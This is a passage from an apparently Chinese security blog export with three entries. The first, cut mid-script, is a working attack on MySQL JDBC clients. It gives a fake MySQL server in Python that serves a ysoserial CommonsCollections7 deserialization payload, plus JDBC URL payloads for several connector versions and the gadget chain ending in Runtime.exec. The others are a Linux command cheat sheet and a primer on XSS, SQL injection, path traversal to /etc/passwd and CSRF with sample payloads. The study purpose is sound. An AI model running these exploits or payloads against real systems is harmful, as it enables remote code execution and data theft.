class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                <span class="comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span></span><br><span class="line">                <span class="comment"># 获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment"># 计算payload长度</span></span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># 计算数据包长度</span></span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>

<p>结合我们所使用的CC链，这里假设目标存在CC链7的漏洞，使用<code>ysoserial</code>构造 payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections7 calc &gt; payload</span><br><span class="line">python3 fake_mysql.py</span><br></pre></td></tr></table></figure>

<p>最终的效果其实是如下的：</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220128204047.png"></p>
<h2 id="JDBC连接mysql的过程"><a href="#JDBC连接mysql的过程" class="headerlink" title="JDBC连接mysql的过程"></a>JDBC连接mysql的过程</h2><p>其实在JDBC连接到Mysql的过程中，有几条内置sql语句被发出，其中两个查询的结果集会在客 ⼾端被处理时会调⽤ObjectInputStream.readObject()进⾏反序列化</p>
<p>这两个查询语句是</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> SESSION STATUS <span class="operator">/</span><span class="operator">/</span>查看session连接数,状态</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">COLLATION</span> <span class="operator">/</span><span class="operator">/</span>显⽰MySQL⽀持字符集的排序规则</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220128204731.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220128204851.png"></p>
<p>我们可以利用这个机制将这两个查询语句，在服务器端“重定向”为查询恶意表，恶意表中某字段存放 恶意Object。</p>
<p>接下来以 <code>wireshark</code>进行演示</p>
<blockquote>
<p>因为是以本地的进行演示，所以需要使用<code>npcap</code>.因为默认的wireshark使用的是<code>winpcap</code>，它不会抓取<code>本地环回</code>的数据包,好像下载了goby之后默认也会下载npcap</p>
</blockquote>
<p>选择loopback</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220128205704.png"></p>
<p>使用<code>tcp.port==3306&amp;&amp;mysql</code>我们来过滤协议</p>
<p>期间有几个坑就是，在连接时候提醒你加一些参数，如下</p>
<blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">characterEncoding<span class="operator">=</span>utf8<span class="operator">&amp;</span>serverTimezone<span class="operator">=</span>UTC<span class="operator">&amp;</span>useSSL<span class="operator">=</span><span class="literal">false</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>接下来分析数据包</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220128211709.png"></p>
<p>登录之后，执行内置的sql语句<code>show session status</code></p>
<h3 id="建立连接的响应包"><a href="#建立连接的响应包" class="headerlink" title="建立连接的响应包"></a>建立连接的响应包</h3><p>根据mysql协议，我们首先需要建立连接，那么，首先需要给mysql客户端发送连接成功的数据包</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220128212159.png"></p>
<p>所以发送<code>0700000200000002000000</code>即可，他就是<code>Response OK</code>的数据包的关键内容&#96;</p>
<h3 id="问候报文之后的响应包"><a href="#问候报文之后的响应包" class="headerlink" title="问候报文之后的响应包"></a>问候报文之后的响应包</h3><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220129182807.png"></p>
<p>在发送问候报文之后，客户端还可能发送其他数据包查询mysql的其他信息，如上图</p>
<p>查看返回的数据包，根据协议类型，可以看到，返回数据包如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220129183026.png"></p>
<p>所以我们伪造的mysql服务器端的时候，在交互数据包的时候，可以发送如上数据包进行一个假的身份认证。</p>
<p>上面师傅的脚本对更多数据查询的情况做了分类，原理类似。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先<code>payload</code>为：</p>
<p><code>jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</code></p>
<p>这里对<code>ServerStatusDiffInterceptor</code>的拦截做一个分析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getObjectDeserializingIfNeeded:<span class="number">4563</span>, ResultSetImpl (com.mysql.jdbc)</span><br><span class="line">getObject:<span class="number">4537</span>, ResultSetImpl (com.mysql.jdbc)</span><br><span class="line">resultSetToMap:<span class="number">467</span>, Util (com.mysql.jdbc)</span><br><span class="line">populateMapWithSessionStatusValues:<span class="number">69</span>, ServerStatusDiffInterceptor (com.mysql.jdbc.interceptors)</span><br><span class="line">preProcess:<span class="number">84</span>, ServerStatusDiffInterceptor (com.mysql.jdbc.interceptors)</span><br><span class="line">preProcess:<span class="number">54</span>, V1toV2StatementInterceptorAdapter (com.mysql.jdbc)</span><br><span class="line">preProcess:<span class="number">65</span>, NoSubInterceptorWrapper (com.mysql.jdbc)</span><br><span class="line">invokeStatementInterceptorsPre:<span class="number">2865</span>, MysqlIO (com.mysql.jdbc)</span><br><span class="line">sqlQueryDirect:<span class="number">2586</span>, MysqlIO (com.mysql.jdbc)</span><br><span class="line">execSQL:<span class="number">2491</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">execSQL:<span class="number">2449</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">executeQuery:<span class="number">1381</span>, StatementImpl (com.mysql.jdbc)</span><br><span class="line">loadServerVariables:<span class="number">3797</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">initializePropsFromServer:<span class="number">3230</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connectOneTryOnly:<span class="number">2243</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">createNewIO:<span class="number">2025</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:<span class="number">778</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:<span class="number">47</span>, JDBC4Connection (com.mysql.jdbc)</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">handleNewInstance:<span class="number">425</span>, Util (com.mysql.jdbc)</span><br><span class="line">getInstance:<span class="number">386</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connect:<span class="number">330</span>, NonRegisteringDriver (com.mysql.jdbc)</span><br><span class="line">getConnection:<span class="number">664</span>, DriverManager (java.sql)</span><br><span class="line">getConnection:<span class="number">247</span>, DriverManager (java.sql)</span><br><span class="line">main:<span class="number">13</span>, Test (JDBC)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220129194636.png"></p>
<p>可以清楚看到 data在接受传递的数据之后，如果开启<code>autoDeserialize=true</code>的属性，则会将得到的属性，继续进行反序列化。</p>
<p>后面的步骤就是参考 CC链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Hashtable.readObject            </span><br><span class="line">     Hashtable.reconstitutionPut</span><br><span class="line">         AbstractMapDecorator.equals</span><br><span class="line">             AbstractMap.equals</span><br><span class="line">                 LazyMap.get                </span><br><span class="line">                   ChainedTransformer.transform</span><br><span class="line">                       InvokerTransformer.transform</span><br><span class="line">                          Runtime.exec</span><br></pre></td></tr></table></figure>

<h2 id="payload总结"><a href="#payload总结" class="headerlink" title="payload总结"></a>payload总结</h2><p>注：以下payload有时对应的情况需要设置 SSL，以及serverTimezone等等参数</p>
<h2 id="ServerStatusDiffInterceptor"><a href="#ServerStatusDiffInterceptor" class="headerlink" title="ServerStatusDiffInterceptor"></a>ServerStatusDiffInterceptor</h2><h3 id="8-x"><a href="#8-x" class="headerlink" title="8.x"></a>8.x</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jdbc:mysql:<span class="comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jdbc:mysql:<span class="comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span></span><br></pre></td></tr></table></figure>

<h3 id="5-x"><a href="#5-x" class="headerlink" title="5.x"></a>5.x</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jdbc:mysql:<span class="comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</span></span><br></pre></td></tr></table></figure>

<h2 id="detectCustomCollations"><a href="#detectCustomCollations" class="headerlink" title="detectCustomCollations"></a>detectCustomCollations</h2><h3 id="5-1-29-5-1-40"><a href="#5-1-29-5-1-40" class="headerlink" title="5.1.29 - 5.1.40"></a>5.1.29 - 5.1.40</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jdbc:mysql:<span class="comment">//x.x.x.x:3306/test?detectCustomCollations=true&amp;autoDeserialize=true</span></span><br></pre></td></tr></table></figure>

<h3 id="5-1-28-5-1-19"><a href="#5-1-28-5-1-19" class="headerlink" title="5.1.28 - 5.1.19"></a>5.1.28 - 5.1.19</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jdbc:mysql:<span class="comment">//127.0.0.1:3306/test?autoDeserialize=true</span></span><br></pre></td></tr></table></figure>

<h2 id="实际应用情况"><a href="#实际应用情况" class="headerlink" title="实际应用情况"></a>实际应用情况</h2><p>在暑假公司师傅挖掘 JDSRC的时候，挖到这么一个漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220129195829.png"></p>
<p>因为现在很多云服务器是基于<code>openstack</code>开发的，所以他们有着很多相似之处，大家遇到了也可以挖挖看</p>
<blockquote>
<p>openstack是什么：<a href="http://c.biancheng.net/view/3892.html">http://c.biancheng.net/view/3892.html</a></p>
</blockquote>
<p>很多云服务厂商有时会提供部署项目等业务，会在本地的云服务器起一台docker等服务以供进行测试，在这时候，服务器端是我们可控的，我们可以尝试这种方法进行攻击。</p>
<h2 id="专门用于mysql伪造的工具"><a href="#专门用于mysql伪造的工具" class="headerlink" title="专门用于mysql伪造的工具"></a>专门用于mysql伪造的工具</h2><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">GitHub - fnmsd&#x2F;MySQL_Fake_Server: MySQL Fake Server use to help MySQL Client File Reading and JDBC Client Java Deserialize</a></p>
]]></content>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux</title>
    <url>/2023/08/09/Linux/</url>
    <content><![CDATA[<h1 id="Linux操作系统获取方式"><a href="#Linux操作系统获取方式" class="headerlink" title="Linux操作系统获取方式"></a>Linux操作系统获取方式</h1><span id="more"></span>

<p>以centOS为例，获取方法大致分为两种：</p>
<ul>
<li><p>从<a href="https://www.centos.org/download/">CentOS官网</a>获取；</p>
</li>
<li><p>从镜像网站获取</p>
<ul>
<li><p>以</p>
<p>阿里云镜像</p>
<p>网站平台为例。</p>
<ul>
<li>新版本镜像地址： <a href="https://mirrors.aliyun.com/centos/">https://mirrors.aliyun.com/centos/</a></li>
<li>旧版本镜像地址： <a href="https://mirrors.aliyun.com/centos-vault/">https://mirrors.aliyun.com/centos-vault/</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="Linux-接口"><a href="#Linux-接口" class="headerlink" title="Linux 接口"></a>Linux 接口</h1><p>Linux 系统是一种金字塔模型的系统，如下所示</p>
<p><img src="https://img2020.cnblogs.com/blog/1515111/202010/1515111-20201010070233641-1312039505.png" alt="img"></p>
<h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><p>pwd 显示工作路径</p>
<p>shutdown -h now 关闭系统  &#x2F;halt 关闭系统</p>
<p>shutdown -r now 重启 &#x2F; reboot 重启</p>
<p>systemctl stop firewalld　　关闭防火墙</p>
<p>ip addr　　查看ip地址</p>
<p>1、<strong>cd命令</strong>：这是一个非常基本，也是大家经常需要使用的命令，它用于切换当前目录，它的参数是要切换到的目录的路径，可以是绝对路径，也可以是相对路径。如：</p>
<p>cd &#x2F;home 　 进入根目录下面的home目录<br>cd home 　 进入当前目录下的home目录<br>cd ..　　　 返回上一层目录<br>cd ..&#x2F;.. 　　 返回上两级目录<br>cd &#x2F;　　　　　返回跟目录<br>cd - 　　　　返回上次所在的目录 </p>
<p>2、<strong>ls命令</strong>：这是一个非常有用的查看文件与目录的命令，list之意，它的参数非常多，下面就列出一些我常用的参数吧，如下：</p>
<p>ls 　　　查看目录中的文件<br>ls -a　　列出全部的文件，连同隐藏文件（开头为.的文件）一起列出来<br>ls -l 　 显示文件和目录的详细资料 </p>
<p>ls A*    意味着只列出以 A 为开头的所有文件</p>
<p>3、<strong>mkdir命令</strong>：创建</p>
<p>mkdir dir1 创建一个叫做 ‘dir1’ 的目录’<br>mkdir dir1 dir2 同时创建两个目录 </p>
<p>4、<strong>rm命令</strong>：删除</p>
<p>rm -f file1　　 删除一个叫做 ‘file1’ 的文件’<br>rmdir dir1 　　删除一个叫做 ‘dir1’ 的目录’ （空目录才能删除）<br>rm -rf dir1 　　删除一个叫做 ‘dir1’ 的目录并同时删除其内容<br>rm -rf dir1 dir2　　 同时删除两个目录及它们的内容 </p>
<p>rm A*      会移除所有以 A 为开头的文件而不是只删除文件名是 <code>A*</code> 的文件</p>
<p>5、<strong>mv命令</strong>：该命令用于移动文件、目录或更名，move之意，它的常用参数如下：-f 如果目标文件已经存在，不会询问而直接覆盖</p>
<p>mv file1 file2  把文件file1重命名为file2 </p>
<p>mv file1 file2 dir  把文件file1、file2移动到目录dir中</p>
<p>6、<strong>cp命令</strong>：该命令用于复制文件，copy之意，它还可以把多个文件一次性地复制到一个目录下， 它的常用参数如下：</p>
<p>cp -a file1 file2 连同文件的所有特性把文件file1复制成文件file2<br>cp dir&#x2F;* . 复制一个目录下的所有文件到当前工作目录<br>cp -a &#x2F;tmp&#x2F;dir1 . 复制一个目录到当前工作目录<br>cp -a dir1 dir2 复制一个目录 </p>
<p>7、<strong>find命令</strong>：find是一个基于查找的功能非常强大的命令</p>
<p>find &#x2F; -name file1 从 ‘&#x2F;‘ 开始进入根文件系统搜索文件和目录<br>find &#x2F; -user user1 搜索属于用户 ‘user1’ 的文件和目录<br>find &#x2F;home&#x2F;user1 -name *.bin 在目录 ‘&#x2F; home&#x2F;user1’ 中搜索带有’.bin’ 结尾的文件<br>find &#x2F;usr&#x2F;bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件<br>find &#x2F;usr&#x2F;bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件 </p>
<p>8、<strong>ps命令</strong>：该命令用于将某个时间点的进程运行情况选取下来并输出，process之意，它的常用参数如下：</p>
<p>-A ：所有的进程均显示出来<br>-a ：不与terminal有关的所有进程<br>-u ：有效用户的相关进程<br>-x ：一般与a参数一起使用，可列出较完整的信息<br>-l ：较长，较详细地将PID的信息列出<br>其实我们只要记住ps一般使用的命令参数搭配即可，它们并不多，如下：</p>
<p>ps aux  查看系统所有的进程数据<br>ps ax  查看不与terminal有关的所有进程<br>ps -lA  查看系统所有的进程数据<br>ps axjf  查看连同一部分进程树状态</p>
<p>9、<strong>kill命令</strong>：该命令用于向某个工作（%jobnumber）或者是某个PID（数字）传送一个信号，它通常与ps和jobs命令一起使用，它的基本语法如下：</p>
<p>kill -signal PID<br>signal的常用参数如下：注：最前面的数字为信号的代号，使用时可以用代号代替相应的信号。</p>
<p>1：SIGHUP，启动被终止的进程<br>2：SIGINT，相当于输入ctrl+c，中断一个程序的进行<br>9：SIGKILL，强制中断一个进程的进行<br>15：SIGTERM，以正常的结束进程方式来终止进程<br>17：SIGSTOP，相当于输入ctrl+z，暂停一个进程的进行<br>例如：</p>
<p># 以正常的结束进程方式来终于第一个后台工作，可用jobs命令查看后台中的第一个工作进程<br>kill -SIGTERM %1<br># 重新改动进程ID为PID的进程，PID可用ps命令通过管道命令加上grep命令进行筛选获得<br>kill -SIGHUP PID </p>
<p> 10、<strong>tar命令</strong>：该命令用于对文件进行打包，默认情况并不会压缩，如果指定了相应的参数，它还会调用相应的压缩程序（如gzip和bzip等）进行压缩和解压。它的常用参数如下：</p>
<ol>
<li>压缩：tar -jcv -f filename.tar.bz2 要被处理的文件或目录名称 </li>
<li>查询：tar -jtv -f filename.tar.bz2 </li>
<li>解压：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录</li>
</ol>
<p>11、chmod命令：该命令用于改变文件的权限，一般的用法如下：</p>
<p>chmod -R 777   chmod -R 777 意思就是将当前目录及目录下所有文件都给予777权限（所有权限）</p>
<p><strong>查看文件内容</strong><br>cat file1 从第一个字节开始正向查看文件的内容<br>tac file1 从最后一行开始反向查看一个文件的内容<br>more file1 查看一个长文件的内容<br>less file1 类似于 ‘more’ 命令，但是它允许在文件中和正向操作一样的反向操作<br>head -2 file1 查看一个文件的前两行<br>tail -2 file1 查看一个文件的最后两行<br>tail -f &#x2F;var&#x2F;log&#x2F;messages 实时查看被添加到一个文件中的内容 </p>
<p><strong>YUM 软件包升级器 - （Fedora, RedHat及类似系统）</strong><br>yum install package_name 下载并安装一个rpm包<br>yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系<br>yum update package_name.rpm 更新当前系统中所有安装的rpm包<br>yum update package_name 更新一个rpm包<br>yum remove package_name 删除一个rpm包<br>yum list 列出当前系统中安装的所有包<br>yum search package_name 在rpm仓库中搜寻软件包<br>yum clean packages 清理rpm缓存删除下载的包<br>yum clean headers 删除所有头文件<br>yum clean all 删除所有缓存的包和头文件 </p>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Java漏洞</title>
    <url>/2023/08/26/Java%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="一、跨站脚本（Cross-Site-Scripting，XSS）"><a href="#一、跨站脚本（Cross-Site-Scripting，XSS）" class="headerlink" title="一、跨站脚本（Cross-Site Scripting，XSS）"></a>一、跨站脚本（Cross-Site Scripting，XSS）</h1><span id="more"></span>

<p>是一种常见的Web安全漏洞，攻击者通过注入恶意代码到网页中，使得这些代码被其他用户的浏览器执行，从而攻击用户的计算机系统.<br><strong>XSS攻击通常分为以下几类：</strong></p>
<ul>
<li><p>反射型XSS：攻击者构造一个恶意的URL，将恶意代码注入到URL中，诱使用户点击该URL，从而触发攻击。</p>
</li>
<li><p>存储型XSS：攻击者将恶意代码存储在服务器上的数据库中，当其他用户访问相应的页面时，这些代码会被读取并执行，从而攻击用户。</p>
</li>
<li><p>DOM-based XSS：攻击者通过修改浏览器中的DOM树，将恶意代码注入到网页中，诱使用户执行恶意代码。</p>
</li>
</ul>
<p>当Java程序扫描到跨站脚本漏洞时，通常会给出一些具体的提示信息，比如漏洞出现的位置、攻击者可以注入的代码类型等等。一般来说，修复跨站脚本漏洞需要在应用程序的代码中加入一些安全措施，如输入验证、输出过滤等，以防止攻击者注入恶意代码。<br><strong>跨站脚本示例：</strong></p>
<p>示例一：</p>
<p>假设有一个搜索页面，用户在该页面输入一个关键词，然后该关键词将被发送到服务器进行搜索，最后将搜索结果返回给用户。</p>
<p>如果程序没有对用户输入的关键词进行过滤，攻击者就可以在搜索框中输入一段恶意的脚本代码，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;XSS attack&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>当其他用户访问该页面并搜索该关键词时，这段恶意代码就会被服务器返回给用户的浏览器执行，从而弹出一个警告框，对用户进行攻击。</p>
<p>为了避免这种攻击，程序应该对用户输入的关键词进行过滤和转义，以确保任何恶意的脚本都无法执行。例如，可以使用一些Web开发框架提供的安全函数来实现这一点，如在Java中可以使用ESAPI库中提供的函数进行输入验证和输出过滤。</p>
<p>示例二</p>
<p>假设有一个Java Web应用程序，其中一个Servlet接收一个名为”message”的参数，并将其显示在页面上。代码如下：</p>
<pre><code>@WebServlet(&quot;/xss&quot;)
public class XssServlet extends HttpServlet &#123;
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;
        String message = request.getParameter(&quot;message&quot;);
        response.setContentType(&quot;text/html&quot;);
        PrintWriter out = response.getWriter();
        out.println(&quot;&lt;html&gt;&quot;);
        out.println(&quot;&lt;head&gt;&quot;);
        out.println(&quot;&lt;title&gt;XSS漏洞示例&lt;/title&gt;&quot;);
        out.println(&quot;&lt;/head&gt;&quot;);
        out.println(&quot;&lt;body&gt;&quot;);
        out.println(&quot;&lt;h1&gt;&quot; + message + &quot;&lt;/h1&gt;&quot;);
        out.println(&quot;&lt;/body&gt;&quot;);
        out.println(&quot;&lt;/html&gt;&quot;);
    &#125;
&#125;
</code></pre>
<p>如果程序没有对用户输入的”message”参数进行过滤和转义，攻击者就可以在URL中注入恶意代码，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/xss?message=&lt;script&gt;alert(&#x27;XSS attack&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>当其他用户访问该URL时，这段恶意代码就会被服务器返回给用户的浏览器执行，从而弹出一个警告框，对用户进行攻击。</p>
<p>为了避免这种攻击，程序应该对用户输入的参数进行过滤和转义，以确保任何恶意的脚本都无法执行。例如，在Java中可以使用ESAPI库中提供的函数进行输入验证和输出过滤，以确保用户输入的数据不会包含任何恶意的脚本。</p>
<h1 id="二、SQL注入（SQL-Injection）漏洞"><a href="#二、SQL注入（SQL-Injection）漏洞" class="headerlink" title="二、SQL注入（SQL Injection）漏洞"></a>二、SQL注入（SQL Injection）漏洞</h1><p>攻击者通过在Web应用程序中注入恶意SQL语句来获取敏感信息，修改数据或者执行任意代码。<br><strong>SQL注入漏洞示例</strong></p>
<p>假设一个Web应用程序中有一个搜索功能，用户可以通过输入关键字搜索相关内容。如果程序没有对用户输入的关键字进行过滤，攻击者就可以在搜索框中注入恶意的SQL语句，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; OR 1=1; --</span><br></pre></td></tr></table></figure>

<p>这段代码将会被拼接到SQL查询语句中，并使查询语句变为：</p>
<pre><code>SELECT * FROM articles WHERE title=&#39;&#39; OR 1=1; -- &#39;
</code></pre>
<p>攻击者就可以绕过身份验证，获取文章列表中所有文章的信息</p>
<h1 id="三、文件包含（File-Inclusion）漏洞"><a href="#三、文件包含（File-Inclusion）漏洞" class="headerlink" title="三、文件包含（File Inclusion）漏洞"></a>三、文件包含（File Inclusion）漏洞</h1><p>攻击者利用Web应用程序中存在的文件包含漏洞，向应用程序中注入恶意代码，以获取敏感信息或者执行任意代码。<br><strong>文件包含漏洞示例</strong></p>
<p>假设一个Web应用程序中有一个功能，允许用户在服务器上查看指定的文件。如果程序没有对用户输入的文件名进行过滤，攻击者就可以通过在URL中注入恶意的文件名来读取任意文件，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/viewfile.php?file=../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p>这段代码将会被拼接到文件路径中，并使程序读取&#x2F;etc&#x2F;passwd文件并将其显示在页面上，攻击者就可以获取敏感信息</p>
<h1 id="四、CSRF（Cross-Site-Request-Forgery）漏洞"><a href="#四、CSRF（Cross-Site-Request-Forgery）漏洞" class="headerlink" title="四、CSRF（Cross-Site Request Forgery）漏洞"></a>四、CSRF（Cross-Site Request Forgery）漏洞</h1><p>攻击者通过欺骗用户在已经登录的Web应用程序中执行某些操作，从而窃取用户的身份验证信息或者执行任意操作。<br><strong>CSRF漏洞示例</strong></p>
<p>假设一个Web应用程序中有一个功能，允许用户通过访问URL来删除自己的帖子。如果程序没有进行CSRF防护，攻击者就可以伪造一个带有删除帖子的请求的页面，欺骗用户点击链接，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://example.com/deletepost.php?postid=123&amp;action=delete&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>当用户点击该链接时，程序将会执行删除操作，攻击者就可以删除用户的帖子。</p>
<h1 id="五、认证与授权漏洞"><a href="#五、认证与授权漏洞" class="headerlink" title="五、认证与授权漏洞"></a>五、认证与授权漏洞</h1><p>攻击者通过欺骗或者绕过Web应用程序的身份验证或者授权机制，获取未授权的访问权限或者执行任意操作。</p>
<p>认证与授权漏洞示例<br>假设一个Web应用程序中的一个页面需要特定的权限才能访问，例如管理员权限。如果程序没有进行足够的身份验证或者授权机制，攻击者就可以绕过该机制，获取管理员权限并执行任意操作。</p>
